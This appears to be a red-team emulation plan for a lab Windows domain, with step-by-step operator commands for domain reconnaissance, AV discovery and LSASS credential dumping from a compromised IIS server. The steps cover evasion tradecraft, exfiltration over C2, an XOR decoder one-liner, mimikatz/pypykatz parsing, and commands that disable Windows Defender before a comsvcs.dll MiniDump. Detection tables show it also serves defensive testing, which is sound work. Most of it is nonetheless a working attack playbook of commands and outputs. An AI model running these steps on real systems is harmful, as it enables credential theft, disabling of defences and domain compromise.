> Discovery, Credential Access

# Phase 2 - Discovery & Credential Access

## Overview

With `NT AUTHORITY\SYSTEM` command execution on `react.testlab.local` established
via the dnscat2 C2 session from Phase 1, the attacker performs targeted discovery
and credential access activities on the IIS server.

**Phase 2 flow:**

1. **Step 1 — Host & Domain Reconnaissance**: Native commands enumerate SYSTEM context, DC info, domain users, and SMB access.

2. **Step 2 — AV Discovery**: `WmiAvQuery.exe` profiles installed antivirus/EDR products.

3. **Step 3 — Credential Access**: `wdhelper.exe` (ReflectDump) acquires LSASS minidump via `RtlCreateProcessReflection` with minimum-mask handle, dumps in-memory via callback, linear position-dependent XOR encryption, output to `%TEMP%\DFxxxx.tmp`.
   - **[ALT] Step 3B**: Disables Windows Defender, then uses `rundll32 + comsvcs.dll MiniDump` as alternative dump method.

---

## Step 1 - Discovery: Host & Domain Reconnaissance

### Voice Track

With SYSTEM-level code execution established, the attacker performs targeted host and
domain reconnaissance using native Windows commands. `whoami /all` confirms the SYSTEM token
and privilege set. `nltest /dsgetdc:` returns the Domain Controller hostname, IP, and role
flags. `net group "Domain Admins" /domain` and `net user /domain` enumerate domain group
membership and accounts — confirming which hashes from credential access activities are
high-value targets. `net view \\DC01` probes whether the DC's admin shares are accessible
over SMB from IIS01, a direct prerequisite for Pass-the-Hash lateral movement in Phase 3.

### Procedures

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), confirm the SYSTEM token and privileges

  ```text
  C:\Windows\Temp> whoami /all
  ```

  - ***Expected Output***

    ```text
    USER INFORMATION
    ----------------
    User Name           SID
    =================== ========
    nt authority\system S-1-5-18

    GROUP INFORMATION
    -----------------
    ...
    Mandatory Label\System Mandatory Level  Label  S-1-16-16384

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                            State
    ========================================= =======
    SeAssignPrimaryTokenPrivilege             Enabled
    SeDebugPrivilege                          Enabled
    ...
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), query the Netlogon service for DC info

  ```text
  C:\Windows\Temp> nltest /dsgetdc:TESTLAB
  ```

  - ***Expected Output***

    ```text
               DC: \\DC01
          Address: \\10.12.10.10
         Dom Guid: <guid>
         Dom Name: TESTLAB
      Forest Name: testlab.local
     Dc Site Name: Default-First-Site-Name
    Our Site Name: Default-First-Site-Name
            Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
    The command completed successfully
    ```

- ☣️ Enumerate Domain Admins group and domain user accounts

  ```text
  C:\Windows\Temp> net group "Domain Admins" /domain
  C:\Windows\Temp> net user /domain
  ```

  - ***Expected Output (`net group`)***

    ```text
    Group name     Domain Admins
    Members
    -------------------------------------------------------------------------------
    Administrator
    ```

- ☣️ Verify DC admin shares are reachable over SMB (precursor to Pass-the-Hash)

  ```text
  C:\Windows\Temp> net view \\DC01
  ```

  - ***Expected Output***

    ```text
    Shared resources at \\DC01

    Share name  Type  Used as  Comment
    -------------------------------------------------------------------------------
    ADMIN$      Disk           Remote Admin
    C$          Disk           Default share
    IPC$        IPC            Remote IPC
    NETLOGON    Disk           Logon server share
    SYSVOL      Disk           Logon server share
    The command completed successfully.
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| whoami.exe SYSTEM token privilege and group enumeration | Discovery | T1033 | System Owner/User Discovery | Windows | whoami.exe executes with command line whoami /all on react.testlab.local | Not Calibrated - Not Benign | native-recon | `whoami /all` dumps the full SYSTEM token - user SID, group memberships, privilege list, integrity level - confirming successful escalation and presence of `SeDebugPrivilege` | react.testlab.local | NT AUTHORITY\SYSTEM | - | - |
| nltest.exe Netlogon domain controller discovery query | Discovery | T1018 | Remote System Discovery | Windows | nltest.exe executes with command line nltest /dsgetdc:TESTLAB on react.testlab.local | Not Calibrated - Not Benign | native-recon | `nltest /dsgetdc:TESTLAB` queries the Netlogon service to return DC hostname (`DC01`), IP (`10.12.10.10`), site, and role flags (PDC, GC, KDC) from the SYSTEM dnscat2 shell | react.testlab.local | NT AUTHORITY\SYSTEM | - | - |
| net.exe Domain Admins group member enumeration | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | net.exe executes with command line net group "Domain Admins" /domain on react.testlab.local | Not Calibrated - Not Benign | native-recon | `net group "Domain Admins" /domain` enumerates DA members to identify high-value credential targets from credential access activities | react.testlab.local | NT AUTHORITY\SYSTEM | - | - |
| net.exe domain user account enumeration | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | net.exe executes with command line net user /domain on react.testlab.local | Not Calibrated - Not Benign | native-recon | `net user /domain` enumerates all domain accounts - cross-referenced against credentials recovered in credential access activities | react.testlab.local | NT AUTHORITY\SYSTEM | - | - |
| net.exe DC01 admin share SMB enumeration | Discovery | T1135 | Network Share Discovery | Windows | net.exe executes with command line net view \\DC01 on react.testlab.local | Not Calibrated - Not Benign | native-recon | `net view \\DC01` enumerates admin shares (`ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`) on the DC to confirm SMB lateral movement path is accessible before Pass-the-Hash | react.testlab.local | NT AUTHORITY\SYSTEM | - | - |


---

## Step 2 - Discovery: Endpoint Security Products

### Voice Track

With the SYSTEM token confirmed and domain topology enumerated, the attacker profiles
installed security software on the IIS server. `WmiAvQuery.exe` — a custom lightweight C++ binary —
is staged to `C:\Windows\Temp` via the existing react2shell upload path and executed under the
SYSTEM context. It queries `ROOT\SecurityCenter2` via WMI COM APIs (`IWbemLocator` → `IWbemServices::ExecQuery`
with WQL `SELECT * FROM AntiVirusProduct`), returning the display name, instance GUID,
paths, and product state of every registered antivirus product. On Windows Server
systems where `SecurityCenter2` is unavailable, the tool transparently falls back to
`ROOT\Microsoft\Windows\Defender` namespace, querying `MSFT_MpComputerStatus` to obtain
antivirus state, real-time protection status, and product version. This gives the
attacker a precise picture of the endpoint protection posture before performing credential
access and lateral movement activities.

### Procedures

- ☣️ In the react2shell session (from Phase 1 Step 1A, still open), stage `WmiAvQuery.exe` as `diaghost.exe` to the IIS server — encode + stream + decode in one step; then rename to `.exe`

  ```
  stage ../../discovery/WmiAvQuery/WmiAvQuery.exe C:\Windows\Temp\diaghost.bin
  rename C:\Windows\Temp\diaghost.bin C:\Windows\Temp\diaghost.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../../discovery/WmiAvQuery.exe (...) -> C:\Windows\Temp\diaghost.bin in N chunks ()...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\Windows\Temp\diaghost.bin (... bytes, !)
    [*] Renaming C:\Windows\Temp\diaghost.bin -> C:\Windows\Temp\diaghost.exe via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> C:\Windows\Temp\diaghost.exe (NO process spawn!)
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), execute `diaghost.exe` to enumerate installed security software

  ```text
  C:\Windows\Temp> diaghost.exe
  ```

  - ***Expected Output (Windows Client - SecurityCenter2)***

    ```text
    [*] Querying installed Antivirus products using WMI COM API...

    === Antivirus Product #1 ===
      displayName: <AV product name>
      instanceGuid: {<guid>}
      pathToSignedProductExe: <path>
      pathToSignedReportingExe: <path>
      productState: 0x<state>
      Product State (Raw): 0x<state>
      Status: ENABLED
      Definitions: UP-TO-DATE

    [+] Total antivirus products found: 1

    [*] Query completed.
    ```

  - ***Expected Output (Windows Server - Defender WMI fallback)***

    ```text
    [*] Querying installed Antivirus products using WMI COM API...

    [!] Could not connect to ROOT\SecurityCenter2 namespace. Error code: 0x8004100e
    [*] This is expected on Windows Server. Attempting fallback...
    [!] Could not connect to ROOT\SecurityCenter namespace either. Error code: 0x8004100e
    [*] Falling back to Windows Defender WMI query...
    [+] Connected to ROOT\Microsoft\Windows\Defender namespace

    === Antivirus Product #1 ===
      displayName: Windows Defender Antivirus
      instanceGuid: {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
      pathToSignedProductExe: C:\Program Files\Windows Defender\MsMpEng.exe
      pathToSignedReportingExe: C:\Program Files\Windows Defender\MpCmdRun.exe
      productVersion: 4.18.26030.3011
      productState: 0x001000
      Product State (Raw): 0x001000
      Status: ENABLED
      Real-Time Protection: ENABLED
      Signature Last Updated: 20260519230814.000000+000

    [+] Total antivirus products found: 1

    [*] Query completed (via WMI fallback).
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| react2shell stage WmiAvQuery.exe binary ingress as diaghost.exe | Command and Control | T1105 | Ingress Tool Transfer | Windows | node.exe (IIS APPPOOL\react.testlab.local) writes PE executable to C:\Windows\Temp\diaghost.bin and renames to C:\Windows\Temp\diaghost.exe on react.testlab.local | Not Calibrated - Not Benign | transport | `stage` reads `WmiAvQuery.exe` locally (staged as `diaghost.bin → diaghost.exe`), base64-encodes in Python memory, streams 2,000-char chunks into `global.__stageBuffer` on target via eval, flushes decoded binary bytes in one `Buffer.from(__stageBuffer,'base64')` write — no child process spawned, no `.b64` on disk | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| diaghost.exe WMI COM AntiVirusProduct security software discovery | Discovery | T1518.001 | Software Discovery: Security Software Discovery | Windows | diaghost.exe spawns from C:\Windows\Temp and queries WMI namespace ROOT\SecurityCenter2 for AntiVirusProduct instances on react.testlab.local | Calibrated - Not Benign | - | `diaghost.exe` (WmiAvQuery.exe, staged under a neutral name) — custom C++ binary — profiles installed AV/EDR products via WMI COM APIs (`IWbemLocator` → `IWbemServices::ExecQuery`); returns display name, instance GUID, paths, and product state of all registered antivirus products; informs post-compromise evasion tuning before credential access in Step 3 | react.testlab.local | NT AUTHORITY\SYSTEM | [WmiAvQuery source](../../resources/payloads/WmiAvQuery/) | - |


---

## Step 3 - Credential Access: LSASS Reflection Dump

### Voice Track

With the IIS environment profiled (Steps 1 and 2), the attacker proceeds to
credential acquisition with `wdhelper.exe` (custom `ReflectDump`). Instead of
the classic `OpenProcess(lsass, PROCESS_ALL_ACCESS) → MiniDumpWriteDump`
chain, the binary forks LSASS via the undocumented
`RtlCreateProcessReflection` and dumps **the fork**, breaking process-name
correlation on the dump handle. The LSASS handle uses a minimum mask
(`REFLECT_ACCESS` ≈ `0x4FA`) — not `0x1FFFFF` — and the clone handle returned
by the API is reused for the dump and termination, so only one EventCode=10
fires. PID discovery uses `EnumProcesses` + `QueryFullProcessImageNameW`
rather than Tool­help. `MiniDumpWriteDump` is resolved at runtime via
`LoadLibraryA("dbghelp.dll")` (no static IAT entry) and writes via an
in-memory `IoWriteAllCallback` into a 75 MB heap buffer; the buffer is
XOR-encrypted with a linear position-dependent key and flushed once to
`%TEMP%\DFxxxx.tmp` (`GetTempFileNameW(L"DF")`, random per run, path printed
on stdout). A bounded poll on `GetExitCodeProcess` replaces the previous
twin `Sleep(5000)` waits, dropping process lifetime to ≈ 1 s. PE metadata is
filled via `ReflectDump.rc` (neutral *Diagnostic Tools* `VS_VERSION_INFO`) to
defeat the empty-metadata heuristic.

> **Technical Deep Dive:** For the full evasion posture, eight-axis change
> summary, detection chain, and mitigation pivots, see
> [`further-reading/lsass-process-reflection.md`](../further-reading/lsass-process-reflection.md).
> For build options and the XOR decoder, see
> [`LsassReflectDumping/README.md`](../../resources/payloads/cred-access/LsassReflectDumping/README.md).

Ingress transfer uses the Phase 1 `stage` path with gzip pre-compression (T1027.015):
`ReflectDump.exe` is gzip-compressed locally to `wdhelper.gz`, then staged via `stage`
— base64-encoded in Python memory, streamed in 2,000-char chunks into the target Node.js
worker's in-process buffer, and flushed as raw `.gz` bytes in a single `writeFileSync`
call with no `.b64` intermediate on disk. On the target, react2shell `decompress`
decompresses via `zlib.gunzipSync`, the binary is renamed to `wdhelper.exe`. Execution runs from the
elevated dnscat2 shell (SYSTEM) and prints the random temp path; exfiltration uses
react2shell's `download` to chunk-stream the file back for offline decode.

### Setup

- ☣️ Build `ReflectDump.exe` from source on the attacker machine (see
  [`LsassReflectDumping/README.md`](../../resources/payloads/cred-access/LsassReflectDumping/README.md#build)
  for full options)

  ```powershell
  msbuild resources\payloads\cred-access\LsassReflectDumping\ReflectDump\ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
  ```

  Output binary: `resources\payloads\cred-access\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`

- ☣️ Gzip-compress `ReflectDump.exe` (T1027.015) — no base64 suffix; `stage` handles base64 encoding internally

  ```bash
  cd resources/payloads/react2shell-tool
  python compress_payload.py ../../cred-access/LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o wdhelper.gz -l 9
  ```

  - ***Expected Output***

    ```text
    [+] Compression successful!
    [*] Original size: <size> bytes
    [*] Compressed size: <compressed_size> bytes
    [*] Compression ratio: ~62%
    [*] Output file: wdhelper.gz
    ```

### Procedures

- ☣️ Launch the react2shell interactive session against `react.testlab.local`

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [*] react2shell - CVE-2025-55182
    [*] Target: http://react.testlab.local
    rce >
    ```

- ☣️ Stage `wdhelper.gz` to the IIS server — encode + stream + decode in one step; then decompress, rename to `wdhelper.exe`, and hide

  ```
  stage wdhelper.gz C:\Windows\Temp\wdhelper.gz
  decompress C:\Windows\Temp\wdhelper.gz C:\Windows\Temp\wdhelper.bin
  rename C:\Windows\Temp\wdhelper.bin C:\Windows\Temp\wdhelper.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../wdhelper.gz (...) -> C:\Windows\Temp\wdhelper.gz in N chunks ()...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\Windows\Temp\wdhelper.gz (... bytes, !)
    [*] Decompressing C:\Windows\Temp\wdhelper.gz -> C:\Windows\Temp\wdhelper.bin via eval (NO spawn - STEALTH!)...
    [+] File decompressed successfully -> C:\Windows\Temp\wdhelper.bin (NO process spawn!)
    [*] T1027.015 - Obfuscated Files or Information: Compression
    [+] File renamed successfully -> C:\Windows\Temp\wdhelper.exe (NO process spawn!)
    ```

- ☣️ From the elevated dnscat2 C2 session (SYSTEM), execute `wdhelper.exe` and
  **capture the printed temp path** (single stdout line)

  ```text
  command (iis-server) 1> shell
  C:\Windows\system32> C:\Windows\Temp\wdhelper.exe
  ```

  - ***Expected Output***

    ```text
    C:\Windows\Temp\DFA1B2.tmp
    ```

    Runtime is ≈ 1 s (bounded poll, no fixed `Sleep(5000)` waits). The randomised
    `DFxxxx.tmp` suffix changes every run; the operator must copy this exact
    path for the next step.

- ☣️ Back in the react2shell session, download the temp file using the path
  printed above — the client decodes each chunk and writes raw bytes directly,
  no separate decode step

  ```
  rce > download C:\Windows\Temp\DFA1B2.tmp
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\Windows\Temp\DFA1B2.tmp (XXXXXXX bytes) in XXXX chunk(s) via eval (NO spawn - STEALTH!)...
    [*] Progress: 100/XXXX chunks (819200/XXXXXXX bytes)
    ...
    [+] File saved to: downloaded_DFA1B2.tmp (XXXXXXX bytes, NO process spawn!)
    ```

  - ***If EPERM error occurs*** — the temp file was created by SYSTEM and the
    AppPool identity lacks read access to files it did not create in
    `C:\Windows\Temp`. From the SYSTEM C2 shell, copy the dump to the IIS
    application root (`C:\inetpub\react.testlab.local`), which the AppPool
    identity can read:

    ```text
    C:\Windows\Temp> copy DFA1B2.tmp C:\inetpub\react.testlab.local\DFA1B2.tmp
    ```

    Then retry in the react2shell session:

    ```
    rce > download C:\inetpub\react.testlab.local\DFA1B2.tmp
    ```

    Remove the staging copy from the app root after download (SYSTEM C2):

    ```text
    C:\> del C:\inetpub\react.testlab.local\DFA1B2.tmp
    ```

- ☣️ Linear position-dependent XOR-decrypt the downloaded file on the attacker
  machine — output is `lsass.dmp` (same decoder used by `NtdsRawDump` /
  `CWLHerpaderping` in this plan)

  ```bash
  python -c "import sys; d=open(sys.argv[1],'rb').read(); open('lsass.dmp','wb').write(bytes(b^((0xA3+i*0x5B)&0xFF) for i,b in enumerate(d)))" downloaded_DFA1B2.tmp
  ```

- ☣️ Parse credentials offline

  ```bash
  pypykatz lsa minidump lsass.dmp
  ```

  OR

  ```text
  mimikatz # sekurlsa::minidump lsass.dmp
  mimikatz # sekurlsa::logonPasswords full
  ```

  - ***Expected Output***

    ```text
    [+] NT hashes / Kerberos tickets / plaintext credentials for domain accounts cached on the IIS server
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| react2shell stage wdhelper.gz compressed payload ingress | Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` running as IIS APPPOOL\react.testlab.local writes a compressed archive to `C:\Windows\Temp` on react.testlab.local | Not Calibrated - Not Benign | transport | `stage` reads `wdhelper.gz` locally, base64-encodes in Python memory, streams 2,000-char chunks into `global.__stageBuffer` on target via eval, flushes decoded gzip bytes in one `Buffer.from(__stageBuffer,'base64')` write — no child process spawned, no `.b64` on disk | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| react2shell decompress gzip PE binary extraction as wdhelper.exe | Defense Evasion | T1027.015 | Obfuscated Files or Information: Compression | Windows | `node.exe` running as IIS APPPOOL\react.testlab.local creates a PE executable file in `C:\Windows\Temp` — extracted from a compressed archive previously written to the same directory by the same process on react.testlab.local | Not Calibrated - Not Benign | staging | react2shell `decompress` command decompresses gzip-compressed payload using built-in Node.js `zlib` module; compression reduces transfer size by ~62% and avoids raw PE structure in transit; decompression occurs via eval-based `fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(in)))` | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decompress()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [compress_payload.py](../../resources/payloads/react2shell-tool/compress_payload.py) |
| EnumProcesses LSASS PID discovery via QueryFullProcessImageNameW | Discovery | T1057 | Process Discovery | Windows | `wdhelper.exe` from `C:\Windows\Temp` opens process query handles to enumerate running processes and identifies `lsass.exe` via image path resolution on react.testlab.local | Not Calibrated - Not Benign | redundant@T1003.001 | `wdhelper.exe` enumerates all running PIDs via `psapi!EnumProcesses` + `kernel32!QueryFullProcessImageNameW` to locate `lsass.exe` — avoids `CreateToolhelp32Snapshot` (Toolhelp) to reduce tradecraft signal | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp ResolveTargetPid()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) | - |
| RtlCreateProcessReflection LSASS process fork with REFLECT_ACCESS handle | Execution | T1106 | Native API | Windows | `wdhelper.exe` from `C:\Windows\Temp` opens a handle to `lsass.exe` with restricted access mask `0x4FA` and a cloned `lsass.exe` process is created on react.testlab.local | Not Calibrated - Not Benign | redundant@T1003.001 | ReflectDump leverages undocumented ntdll.dll export `RtlCreateProcessReflection` to fork LSASS; LSASS handle uses `REFLECT_ACCESS` (~0x4FA — minimum mask the API requires) instead of `PROCESS_ALL_ACCESS`; reflection clone handle is reused from the API's output (no second `OpenProcess` on the clone PID) | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) |
| MiniDumpWriteDump LSASS reflection process memory dump | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `wdhelper.exe` loads `dbghelp.dll`, accesses a cloned `lsass.exe` process, and writes a >50 MB high-entropy file to `C:\Windows\Temp` on react.testlab.local | Calibrated - Not Benign | - | ReflectDump forks LSASS via `RtlCreateProcessReflection`, dumps the fork via `MiniDumpWriteDump` with `IoWriteAllCallback` into a 75 MB heap buffer, encrypts the buffer in place with a linear position-dependent XOR (`(0xA3 + i*0x5B) & 0xFF`), then flushes to a randomised temp path resolved via `GetTempPathW` + `GetTempFileNameW(L"DF")`; reflection terminated through its existing handle after dump | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) |
| XorEncode linear position-dependent XOR dump buffer encryption | Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | N/A — C1: XOR encryption is an in-memory buffer transform; the only observable artifact is the high-entropy output file already captured by T1003.001; the XOR key constants (0xA3, 0x5B) are operator-chosen and rotatable between engagements | Not Calibrated - Not Benign | C1 | ReflectDump XOR-encrypts the entire 75 MB dump buffer in place via `XorEncode` with linear position-dependent key `p[i] ^= (0xA3 + i*0x5B) & 0xFF` before `WriteFile`; same scheme shared with `NtdsRawDump` and `CWLHerpaderping` in this plan (single Python decoder for the family) | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp XorEncode()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) |
| LoadLibraryA dbghelp.dll MiniDumpWriteDump runtime API resolution | Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `wdhelper.exe` from `C:\Windows\Temp` loads `dbghelp.dll` at runtime and calls `MiniDumpWriteDump` without a corresponding static IAT entry on react.testlab.local | Not Calibrated - Not Benign | redundant@T1003.001 | ReflectDump resolves `MiniDumpWriteDump` at runtime via `LoadLibraryA("dbghelp.dll")` + `GetProcAddress("MiniDumpWriteDump")` — removing the static IAT entry that would flag the binary as a credential-dump tool; `RtlCreateProcessReflection` and the LSASS target name are likewise assembled as runtime arrays | react.testlab.local | NT AUTHORITY\SYSTEM | [Source.cpp main()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) |
| VS_VERSION_INFO diagnostic tool PE metadata masquerade | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `wdhelper.exe` in `C:\Windows\Temp` carries a `VS_VERSION_INFO` resource with a non-empty `FileDescription` claiming diagnostic tool origin, but the binary is unsigned and executes from a non-system directory on react.testlab.local | Calibrated - Not Benign | - | ReflectDump staged as `wdhelper.exe` and stamped with neutral diagnostic-tool PE metadata via `ReflectDump.rc` (defeats the "fresh PE with empty `VS_VERSION_INFO`" heuristic); dump written as `DFxxxx.tmp` under `%TEMP%` via `GetTempFileNameW(L"DF")` to blend with legitimate temp artefacts and randomise the path per run | react.testlab.local | NT AUTHORITY\SYSTEM | [ReflectDump.rc](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/ReflectDump.rc), [Source.cpp main()](../../resources/payloads/cred-access/LsassReflectDumping/ReflectDump/ReflectDump/Source.cpp) |
| react2shell download DFxxxx.tmp 8192-byte chunked exfiltration | Exfiltration | T1030 | Data Transfer Size Limits | Windows | `node.exe` (IIS APPPOOL\react.testlab.local) sends outbound data in a sequence of HTTP responses each carrying a fixed-size base64 chunk, the total transferred volume matching a recently-written temp file on react.testlab.local | Calibrated - Not Benign | - | react2shell `download` command exfiltrates the randomised temp dump file as base64 in 8,192-byte chunks over successive HTTP responses | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) |
| react2shell HTTP C2 channel DFxxxx.tmp dump exfiltration | Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | `node.exe` (IIS APPPOOL\react.testlab.local) exfiltrates >50 MB of data over the same HTTP eval channel used for C2 command execution — outbound response sizes deviate from the normal C2 command-output baseline (<1 KB per response) on react.testlab.local | Calibrated - Not Benign | - | react2shell `download` exfiltrates the XOR-encrypted LSASS dump over the existing react2shell HTTP C2 channel established in Phase 1 Step 1; same channel carries all stage/rename/decompress operations in this phase — data volume distinguishes exfiltration from normal C2 command traffic | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) |

---

> **Optional Step** — Alternative LSASS acquisition via `rundll32.exe` + `comsvcs.dll MiniDump`. Execute in addition to or instead of Step 1 to exercise a distinct detection rule family. This method is more widely detected than the `RtlCreateProcessReflection` approach and is flagged by most EDR products — proceed only if testing the `comsvcs.dll MiniDump` detection chain is an explicit objective for this run.

## [ALT] Step 3B — Alternative Credential Access: LSASS Dump via Rundll32 + comsvcs.dll (Optional)

> This section suppresses Windows Defender before running the alternative LSASS dump procedure. The `rundll32 + comsvcs.dll` approach is more widely detected than Step 3's `RtlCreateProcessReflection` method and generates observable ETW/Sysmon events. Disabling Defender reduces quarantine risk during execution. Skip this section if Defender is absent, disabled by policy, or if suppressing AV detection would interfere with test objectives for this run.

### Voice Track

As an alternative or supplementary LSASS acquisition technique, the attacker suppresses Windows Defender
before invoking the `comsvcs.dll MiniDump` method. Two complementary AV suppression methods are applied
from the SYSTEM dnscat2 shell: PowerShell `Set-MpPreference` disables real-time, behaviour, and script
scanning; a parallel `reg add` write persists the disablement across reboots via Group Policy. This dual-vector
suppression matches the sequences documented in LockBit Black and Conti playbooks.

With Defender suppressed, the attacker then opens a direct `PROCESS_ALL_ACCESS` handle to `lsass.exe` and
passes it to `comsvcs.dll`'s `MiniDump` export via `rundll32.exe`. Unlike the `RtlCreateProcessReflection`
approach in Step 3, this method produces a standard Windows minidump with intact MDMP magic bytes — more
visible to static scanners, but useful for testing LSASS handle-open detection. The two approaches exercise
independent detection chains.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, disable Defender real-time, behaviour, and script scanning

  ```text
  C:\Windows\Temp> powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1"
  ```

  - ***Expected Output***

    ```text
    (no output — Set-MpPreference applies settings silently)
    ```

  > **Note:** On Windows Server 2022 with Defender installed, the cmdlet completes
  > silently and Windows Security Centre reflects the change immediately. If the lab
  > Defender policy is managed via GPO from DC01, the GPO may override
  > `Set-MpPreference` values on the next refresh — the `reg add` step below takes
  > precedence when applied under the Policy path.

- ☣️ Write the Group Policy Defender disable key to persist the setting across reboots

  ```text
  C:\Windows\Temp> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- Obtain the LSASS PID from the SYSTEM dnscat2 shell

  ```text
  C:\Windows\Temp> powershell -NoProfile -Command "(Get-Process lsass).Id"
  ```

  - ***Expected Output***

    ```text
    <lsass_pid>
    ```

- ☣️ Invoke `rundll32.exe` to dump LSASS memory via `comsvcs.dll MiniDump`

  ```text
  C:\Windows\Temp> rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Windows\Temp\g.dmp full
  ```

  - ***Expected Output***

    ```text
    (no console output — rundll32.exe returns silently on success)
    ```

- Verify the dump file was created

  ```text
  C:\Windows\Temp> dir g.dmp
  ```

  - ***Expected Output***

    ```text
     Directory of C:\Windows\Temp

    <date>  <time>    <size> g.dmp
                   1 File(s)    <size> bytes
    ```

    File size will be in the tens to hundreds of MB depending on LSASS working set.

- ☣️ Download the dump file via react2shell for offline parsing

  ```
  rce > download C:\Windows\Temp\g.dmp
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\Windows\Temp\g.dmp (XXXXXXX bytes) in XXXX chunk(s) via eval (NO spawn - STEALTH!)...
    ...
    [+] File saved to: downloaded_g.dmp (XXXXXXX bytes, NO process spawn!)
    ```

- ☣️ Parse credentials offline

  ```bash
  pypykatz lsa minidump downloaded_g.dmp
  ```

  - ***Expected Output***

    ```text
    [+] NT hashes / Kerberos tickets / plaintext credentials for domain accounts cached on the IIS server
    ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| Set-MpPreference Windows Defender real-time monitoring disable | Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | `powershell.exe` executes with command line containing `Set-MpPreference -DisableRealtimeMonitoring 1` on IIS01 | Calibrated - Not Benign | - | `Set-MpPreference` disables Defender real-time, behaviour, and script scanning from the SYSTEM dnscat2 shell — suppresses AV detection before running the `comsvcs.dll MiniDump` credential access technique | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| reg.exe DisableAntiSpyware Group Policy registry write | Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | `reg.exe` sets `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware` to `1` on IIS01 | Calibrated - Not Benign | - | `reg add` writes `DisableAntiSpyware=1` under the Windows Defender Group Policy registry path — persists AV disablement across reboots via the policy enforcement path, separately from the `Set-MpPreference` runtime change | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
